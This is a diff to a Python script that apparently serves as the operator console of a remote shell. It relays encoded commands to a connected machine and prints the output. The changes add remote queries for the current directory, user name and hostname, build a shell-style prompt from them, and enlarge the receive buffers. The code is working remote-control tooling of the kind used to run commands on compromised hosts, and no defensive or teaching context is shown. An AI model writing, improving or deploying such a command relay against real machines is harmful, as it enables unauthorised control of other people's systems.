@@ -31,16 +31,28 @@ def main():
     print("Client is:",client)
 
     while True:
+        # Extracting the current working directory
         a=en('pwd')
         client.send(a)
-        r1=client.recv(2048).decode()
+        r1=client.recv(4096).decode()
         r=de(r1).decode()
+        # Extracting the current user name
+        username=en('echo $USER')
+        client.send(username)
+        u1=client.recv(4096).decode()
+        u=de(u1).decode()
+        # Extracting the system name
+        hostname=en('hostname')
+        client.send(hostname)
+        h1=client.recv(4096).decode()
+        h=de(h1).decode()
+        starting='\033[1m ~'+u[:len(u)-2]+'@'+h[:len(h)-2]+':'+r[:len(r)-2]+'$\033[0m'
         # print("Current directory is:",r)
-        c=input('~'+r[:len(r)-2]+'$')
+        c=input(starting)
         c=en(c)
         # Sending the encoded command to the remote system
         client.send(c)
-        res1=client.recv(2048).decode()
+        res1=client.recv(4096).decode()
         res=de(res1).decode().split('~')
         if res[1]:
             print(res[1])
